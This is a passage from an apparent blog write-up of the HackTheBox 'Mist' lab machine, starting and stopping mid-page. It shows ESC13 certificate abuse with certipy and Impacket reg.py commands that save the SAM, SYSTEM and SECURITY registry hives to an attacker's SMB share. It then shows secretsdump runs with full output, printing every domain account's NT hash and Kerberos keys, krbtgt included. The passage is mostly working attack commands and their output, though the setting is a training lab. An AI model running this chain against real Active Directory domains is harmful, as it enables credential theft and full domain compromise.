class="keyword">for</span> <span class="string">&#x27;svc_cabackup@mist.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64</span><br></pre></td></tr></table></figure></div>

<h5 id="ESC13-Abuse"><a href="#ESC13-Abuse" class="headerlink" title="ESC13 Abuse"></a>ESC13 Abuse</h5><p>When the certificate we apply for have OID group, we can obtain the permissions from this group. So as long as all certificates and OIDs are enumerated, we can find a path:<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1" >https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> is a good resource for this enumeration.</p>
<p>I will now request a certificate for the svc_cabackup service account using certipy-ad, successfully obtaining a certificate and its private key saved as svc_cabackup.pfx. After authenticating with this certificate, we’ll retrieve the NT hash for the service account and save the Kerberos credential cache for later use. Finally, extract the SAM registry hive from the target domain controller to dump secrets with it :) .</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist]</span><br><span class="line">└─$ proxychains4 certipy-ad req -u <span class="string">&#x27;svc_cabackup@mist.htb&#x27;</span> -k -no-pass -dc-ip 192.168.100.100 -dns 192.168.100.100 -ca mist-DC01-CA -target DC01.mist.htb -template <span class="string">&#x27;BackupSvcAuthentication&#x27;</span> -ca mist-DC01-CA -key-size 4096 -debug</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Domain retrieved from CCache: MIST.HTB</span><br><span class="line">[+] Username retrieved from CCache: svc_cabackup</span><br><span class="line">[+] Trying to resolve <span class="string">&#x27;DC01.mist.htb&#x27;</span> at <span class="string">&#x27;192.168.100.100&#x27;</span></span><br><span class="line">[+] Generating RSA key</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[+] Using Kerberos Cache: svc_cabackup.ccache</span><br><span class="line">[+] Using TGT from cache</span><br><span class="line">[+] Username retrieved from CCache: svc_cabackup</span><br><span class="line">[+] Getting TGS <span class="keyword">for</span> <span class="string">&#x27;host/DC01.mist.htb&#x27;</span></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:88  ...  OK</span><br><span class="line">[+] Got TGS <span class="keyword">for</span> <span class="string">&#x27;host/DC01.mist.htb&#x27;</span></span><br><span class="line">[+] Trying to connect to endpoint: ncacn_np:192.168.100.100[\pipe\cert]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">[+] Connected to endpoint: ncacn_np:192.168.100.100[\pipe\cert]</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 70</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;svc_cabackup@mist.htb&#x27;</span></span><br><span class="line">[*] Certificate object SID is <span class="string">&#x27;S-1-5-21-1045809509-3006658589-2426055941-1135&#x27;</span></span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;svc_cabackup.pfx&#x27;</span></span><br><span class="line">                                                                                    </span><br><span class="line">                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist]</span><br><span class="line">└─$ proxychains4 certipy-ad auth -pfx ./svc_cabackup.pfx -dc-ip 192.168.100.100 -debug</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: svc_cabackup@mist.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:88  ...  OK</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;svc_cabackup.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup&#x27;</span></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:88  ...  OK</span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup@mist.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64</span><br><span class="line">                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=svc_cabackup.ccache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist]</span><br><span class="line">└─$ proxychains python3 ./impacket/examples/reg.py  <span class="string">&#x27;mist.htb/svc_cabackup@dc01.mist.htb&#x27;</span> -k -no-pass -dc-ip 192.168.100.100 save -keyName <span class="string">&#x27;HKLM\SAM&#x27;</span> -o <span class="string">&#x27;\\10.10.x.x\kujen&#x27;</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:88  ...  OK</span><br><span class="line">[!] Cannot check RemoteRegistry status. Hoping it is started...</span><br><span class="line">[*] Saved HKLM\SAM to \\10.10.x.x\kujen\SAM.save</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~/impacket/examples]</span><br><span class="line">└─$ proxychains4 impacket-smbserver -smb2support  kujen ./                       130 ⨯</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">09/10/2024 11:42:50 AM: INFO: Config file parsed</span><br><span class="line">proxychains4 ~ / Tools / ampacket / bin / python3 ~ / Tools / ampacket / examples / reg.py mist.htb / svc_cabackup@dc01.mist.htb -k -no-pass -dc-ip 192.168.100kup</span><br><span class="line">09/10/2024 11:46:22 AM: INFO: Incoming connection (10.129.166.107,64490)</span><br><span class="line">09/10/2024 11:46:23 AM: INFO: AUTHENTICATE_MESSAGE (\,DC01)</span><br><span class="line">09/10/2024 11:46:23 AM: INFO: User DC01\ authenticated successfully</span><br><span class="line">09/10/2024 11:46:23 AM: INFO: :::00::aaaaaaaaaaaaaaaa</span><br><span class="line">09/10/2024 11:46:23 AM: INFO: Connecting Share(1:IPC$)</span><br><span class="line">09/10/2024 11:46:23 AM: INFO: Connecting Share(2:kujen)</span><br><span class="line">09/10/2024 11:46:33 AM: INFO: Disconnecting Share(1:IPC$)</span><br><span class="line">09/10/2024 11:46:39 AM: INFO: Disconnecting Share(2:kujen)</span><br><span class="line">09/10/2024 11:46:39 AM: INFO: Closing down connection (10.129.166.107,64490)</span><br><span class="line">09/10/2024 11:46:39 AM: INFO: Remaining connections []</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>I’ll now run impacket-secretsdump to extract SAM hashes, as well as cached domain logon information and LSA secrets from the saved registry files. I successfully retrieved the hashe for the Administrator and including machine account credentials.</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist]</span><br><span class="line">└─$ proxychains4 -q python3 impacket/examples/reg.py dc01.mist.htb -dc-ip 192.168.100.100 -target-ip 192.168.100.100 -k -debug backup -o <span class="string">&#x27;\\10.10.x.x\kujen&#x27;</span></span><br><span class="line"></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.12.0-py3.11.egg/impacket</span><br><span class="line">[+] Using Kerberos Cache: svc_cabackup.ccache</span><br><span class="line">[+] Domain retrieved from CCache: MIST.HTB</span><br><span class="line">[+] SPN CIFS/DC01.MIST.HTB@MIST.HTB not found <span class="keyword">in</span> cache</span><br><span class="line">[+] AnySPN is True, looking <span class="keyword">for</span> another suitable SPN</span><br><span class="line">[+] Returning cached credential <span class="keyword">for</span> KRBTGT/MIST.HTB@MIST.HTB</span><br><span class="line">[+] Using TGT from cache</span><br><span class="line">[+] Username retrieved from CCache: svc_cabackup</span><br><span class="line">[+] Trying to connect to KDC at 192.168.100.100:88</span><br><span class="line">[+] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[!] Cannot check RemoteRegistry status. Hoping it is started...</span><br><span class="line">[+] Dumping HKLM\SAM, be patient it can take a <span class="keyword">while</span> <span class="keyword">for</span> large hives (e.g. HKLM\SYSTEM)</span><br><span class="line">[*] Saved HKLM\SAM to \\10.10.x.x\kujen\SAM.save</span><br><span class="line">[+] Dumping HKLM\SYSTEM, be patient it can take a <span class="keyword">while</span> <span class="keyword">for</span> large hives (e.g. HKLM\SYSTEM)</span><br><span class="line">[-] Couldn<span class="string">&#x27;t save HKLM\SYSTEM: RRP SessionError: code: 0xb7 - ERROR_ALREADY_EXISTS - Cannot create a file when that file already exists.</span></span><br><span class="line"><span class="string">[+] Dumping HKLM\SECURITY, be patient it can take a while for large hives (e.g. HKLM\SYSTEM)</span></span><br><span class="line"><span class="string">[*] Saved HKLM\SECURITY to \\10.10.x.x\kujen\SECURITY.save</span></span><br><span class="line"><span class="string">                                                                                       </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/hackthebox/mist]</span></span><br><span class="line"><span class="string">└─$ cd   </span></span><br><span class="line"><span class="string">                                                                                       </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~]</span></span><br><span class="line"><span class="string">└─$ cd hackthebox/mist       </span></span><br><span class="line"><span class="string">                                                                                       </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/hackthebox/mist]</span></span><br><span class="line"><span class="string">└─$ ls                </span></span><br><span class="line"><span class="string">71.key                DavRelayUp.exe      ntlmrelayx.py   sharon.hash</span></span><br><span class="line"><span class="string">72.key                image_20022024.png  openssl.exe     sharon.kdbx</span></span><br><span class="line"><span class="string">74.key                impacket            PetitPotam      socatx64.exe</span></span><br><span class="line"><span class="string">75.key                kujen.exe           PetitPotam.exe  svc_cabackup.ccache</span></span><br><span class="line"><span class="string">Administrator.ccache  kujen.php           pivotsuite.exe  svc_cabackup.pfx</span></span><br><span class="line"><span class="string">cats.png              kujen.zip           pywhisker       SYSTEM.save</span></span><br><span class="line"><span class="string">Certify.exe           ligol.exe           Rubeus.exe      test.rule</span></span><br><span class="line"><span class="string">cert.pfx              ligolo-ng           RubeusToCcache  words.txt</span></span><br><span class="line"><span class="string">chisel.exe            ms01.ccache         SAM.save</span></span><br><span class="line"><span class="string">Coercer               ms01.kirbi          SECURITY.save</span></span><br><span class="line"><span class="string">                                                                                       </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/hackthebox/mist]</span></span><br><span class="line"><span class="string">└─$ impacket-secretsdump local -sam SAM.save -security SECURITY.save -system SYSTEM.save                           </span></span><br><span class="line"><span class="string">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Target system bootKey: 0x47c7c97d3b39b2a20477a77d25153da5</span></span><br><span class="line"><span class="string">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e121bd371bd4bbaca21175947013dd7:::</span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="string">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="string">[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn&#x27;</span>t have <span class="built_in">hash</span> information.</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:<span class="built_in">hash</span>)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] <span class="variable">$MACHINE</span>.ACC </span><br><span class="line"><span class="variable">$MACHINE</span>.ACC:plain_password_hex:c68cb851aa6312ad86b532db8103025cb80e69025bd381860316ba55b056b9e1248e7817ab7fc5b23c232a5bd2aa5b8515041dc3dc47fa4e2d4c34c7db403c7edc4418cf22a1b8c2c544c464ec9fedefb1dcdbebff68c6e9a103f67f3032b68e7770b4e8e22ef05b29d002cc0e22ad4873a11ce9bac40785dcc566d38bb3e2f0d825d2f4011b566ccefdc55f098c3b76affb9a73c6212f69002655dd7b774673bf8eecaccd517e9550d88e33677ceba96f4bc273e4999bbd518673343c0a15804c43fde897c9bd579830258b630897e79d93d0c22edc2f933c7ec22c49514a2edabd5d546346ce55a0833fc2d8403780</span><br><span class="line"><span class="variable">$MACHINE</span>.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0xc78bf46f3d899c3922815140240178912cb2eb59</span><br><span class="line">dpapi_userkey:0xc62a01b328674180712ffa554dd33d468d3ad7b8</span><br><span class="line">[*] NL<span class="variable">$KM</span> </span><br><span class="line"> 0000   C4 C5 BF 4E A9 98 BD 1B  77 0E 76 A1 D3 09 4C AB   ...N....w.v...L.</span><br><span class="line"> 0010   B6 95 C7 55 E8 5E 4C 48  55 90 C0 26 19 85 D4 C2   ...U.^LHU..&amp;....</span><br><span class="line"> 0020   67 D7 76 64 01 C8 61 B8  ED D6 D1 AF 17 5E 3D FC   g.vd..a......^=.</span><br><span class="line"> 0030   13 E5 4D 46 07 5F 2B 67  D3 53 B7 6F E6 B6 27 31   ..MF._+g.S.o..<span class="string">&#x27;1</span></span><br><span class="line"><span class="string">NL$KM:c4c5bf4ea998bd1b770e76a1d3094cabb695c755e85e4c485590c0261985d4c267d7766401c861b8edd6d1af175e3dfc13e54d46075f2b67d353b76fe6b62731</span></span><br><span class="line"><span class="string">[*] Cleaning up...</span></span><br></pre></td></tr></table></figure></div>

<p>Now secrets dump to get our Administrator hash:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist]</span><br><span class="line">└─$ proxychains4 python3 impacket/examples/secretsdump.py -hashes <span class="string">&quot;:e768c4cf883a87ba9e96278990292260&quot;</span>  DC01\<span class="variable">$@192</span>.168.100.100</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:49670  ...  OK</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:298fe98ac9ccf7bd9e91a69b8c02e86f:::</span><br><span class="line">Sharon.Mullard:1109:aad3b435b51404eeaad3b435b51404ee:1f806175e243ed95db55c7f65edbe0a0:::</span><br><span class="line">Brandon.Keywarp:1110:aad3b435b51404eeaad3b435b51404ee:db03d6a77a2205bc1d07082740626cc9:::</span><br><span class="line">Florence.Brown:1111:aad3b435b51404eeaad3b435b51404ee:9ee69a8347d91465627365c41214edd6:::</span><br><span class="line">Jonathan.Clinton:1112:aad3b435b51404eeaad3b435b51404ee:165fbae679924fc539385923aa16e26b:::</span><br><span class="line">Markus.Roheb:1113:aad3b435b51404eeaad3b435b51404ee:74f1d3e2e40af8e3c2837ba96cc9313f:::</span><br><span class="line">Shivangi.Sumpta:1114:aad3b435b51404eeaad3b435b51404ee:4847f5daf1f995f14c262a1afce61230:::</span><br><span class="line">Harry.Beaucorn:1115:aad3b435b51404eeaad3b435b51404ee:a3188ac61d66708a2bd798fa4acca959:::</span><br><span class="line">op_Sharon.Mullard:1122:aad3b435b51404eeaad3b435b51404ee:d25863965a29b64af7959c3d19588dd7:::</span><br><span class="line">op_Markus.Roheb:1123:aad3b435b51404eeaad3b435b51404ee:73e3be0e5508d1ffc3eb57d48b7b8a92:::</span><br><span class="line">svc_smb:1125:aad3b435b51404eeaad3b435b51404ee:1921d81fdbc829e0a176cb4891467185:::</span><br><span class="line">svc_cabackup:1135:aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260:::</span><br><span class="line">MS01$:1108:aad3b435b51404eeaad3b435b51404ee:57e09da59439ab2d04c15e9250237f48:::</span><br><span class="line">svc_ca$:1124:aad3b435b51404eeaad3b435b51404ee:542fb8bb34abc7460eb6800cd6399e54:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:223c1b3a34e024798181df5812ff08617c8a874473002ca892f5f3312a0367d2</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:98610a32239f909d2dd7191a0b200af3</span><br><span class="line">Administrator:des-cbc-md5:89e007fbc8197319</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:1f8d633a6aca948f3cfe1ae103ef2245825dc2f16ed171823ac817c097aea0f1</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:d746342824512200d29d504b040e150b</span><br><span class="line">krbtgt:des-cbc-md5:4923193b1c981332</span><br><span class="line">Sharon.Mullard:aes256-cts-hmac-sha1-96:46f1b3a696d5ce7194654e1ee205e05e5fc40fc6726232494d50172697404f59</span><br><span class="line">Sharon.Mullard:aes128-cts-hmac-sha1-96:ce1d4f67122df39096a0304087a37af9</span><br><span class="line">Sharon.Mullard:des-cbc-md5:1a7f4054163d7580</span><br><span class="line">Brandon.Keywarp:aes256-cts-hmac-sha1-96:5b6d15db9b7d5a87e6fab031a46dc560df979523edf72109a33dbee4c9023e2a</span><br><span class="line">Brandon.Keywarp:aes128-cts-hmac-sha1-96:c94f80b1f0f52971bc210cb7fa08e548</span><br><span class="line">Brandon.Keywarp:des-cbc-md5:80757608c7fef2ec</span><br><span class="line">Florence.Brown:aes256-cts-hmac-sha1-96:30edaa3ce504213f32a4ea4b4ee209788bc022d2702f45e512b8d552b530d9f3</span><br><span class="line">Florence.Brown:aes128-cts-hmac-sha1-96:68085dd2a95d4ead421af52312472061</span><br><span class="line">Florence.Brown:des-cbc-md5:ce7508bc0e7998ab</span><br><span class="line">Jonathan.Clinton:aes256-cts-hmac-sha1-96:ac2f7bfaee93c245ebbd9959fa420c32b1d69780560c8a23c605eb47e5d6cc46</span><br><span class="line">Jonathan.Clinton:aes128-cts-hmac-sha1-96:467238a4a231a28930e412d27ed8b09a</span><br><span class="line">Jonathan.Clinton:des-cbc-md5:087c674fcdf1bf8f</span><br><span class="line">Markus.Roheb:aes256-cts-hmac-sha1-96:48553e83896443f93aa77b0f280407f02d0a13da45c2c39598fb0fa298c17043</span><br><span class="line">Markus.Roheb:aes128-cts-hmac-sha1-96:e48c992fe7678056ac85e0fe169c02c5</span><br><span class="line">Markus.Roheb:des-cbc-md5:7940c4c8259b1af7</span><br><span class="line">Shivangi.Sumpta:aes256-cts-hmac-sha1-96:4b6f0e6c634bdc4dad3b91b42fec80135c5520f49aa7f7d541d27aacfce21d89</span><br><span class="line">Shivangi.Sumpta:aes128-cts-hmac-sha1-96:25fba62098625aecfe9f335aa71a01cb</span><br><span class="line">Shivangi.Sumpta:des-cbc-md5:c24fa21ccb91aba1</span><br><span class="line">Harry.Beaucorn:aes256-cts-hmac-sha1-96:f85edbb56f68155fb8b45360ba2e67cbe67893c8875d7ae1ea2a54085f082a73</span><br><span class="line">Harry.Beaucorn:aes128-cts-hmac-sha1-96:e21bf6bd700e77fdea81121431629f4c</span><br><span class="line">Harry.Beaucorn:des-cbc-md5:ab7c137ad364e66e</span><br><span class="line">op_Sharon.Mullard:aes256-cts-hmac-sha1-96:14457283d779320d1bf9e003ee084c9f70d8fec7324345ac15d16241c512299f</span><br><span class="line">op_Sharon.Mullard:aes128-cts-hmac-sha1-96:c439ce69fb34c7b2c693cd11dabd2488</span><br><span class="line">op_Sharon.Mullard:des-cbc-md5:8cc158f8527585ba</span><br><span class="line">op_Markus.Roheb:aes256-cts-hmac-sha1-96:630b8034289cce271b529607039bff05635578b555f055e15398e90665a3a91b</span><br><span class="line">op_Markus.Roheb:aes128-cts-hmac-sha1-96:48f2924abb1cdbe2b029a679b9f95e2c</span><br><span class="line">op_Markus.Roheb:des-cbc-md5:3876f7baa1e97932</span><br><span class="line">svc_smb:aes256-cts-hmac-sha1-96:ab6fd9c7fb1497cd70e54fbe3e763cfac26fa660ceee14492736c6c183b74e37</span><br><span class="line">svc_smb:aes128-cts-hmac-sha1-96:a8626be32fc03eff20e28b11101cd262</span><br><span class="line">svc_smb:des-cbc-md5:b0f8bfb5e6ea0431</span><br><span class="line">svc_cabackup:aes256-cts-hmac-sha1-96:7bb6d62ae4d9438ed967ac87ebe16c00ed8eec1d2ef6979288ad16a0ef9d1dd4</span><br><span class="line">svc_cabackup:aes128-cts-hmac-sha1-96:f85ae26f1f4f33686293221872fef92a</span><br><span class="line">svc_cabackup:des-cbc-md5:4a7504e5341910df</span><br><span class="line">DC01$:aes256-cts-hmac-sha1-96:a47600b1ff206958b49938fdff101d4444253de01f595c7fe1a5276e4265c245</span><br><span class="line">DC01$:aes128-cts-hmac-sha1-96:7043bf9b8bf4e5886058da7defab4581</span><br><span class="line">DC01$:des-cbc-md5:07fef70d97161502</span><br><span class="line">MS01$:aes256-cts-hmac-sha1-96:b3107efe1a98f9ab2d29a43d41e44203baffa82e9757559b435d2bb71ed125c0</span><br><span class="line">MS01$:aes128-cts-hmac-sha1-96:de935c0538bbae17e9cd85d689d5dc92</span><br><span class="line">MS01$:des-cbc-md5:32d98c98ae19f42c</span><br><span class="line">svc_ca$:aes256-cts-hmac-sha1-96:a51977f4850abae95348471e794550d92bfa970e182e259476ff2c7587f64d7f</span><br><span 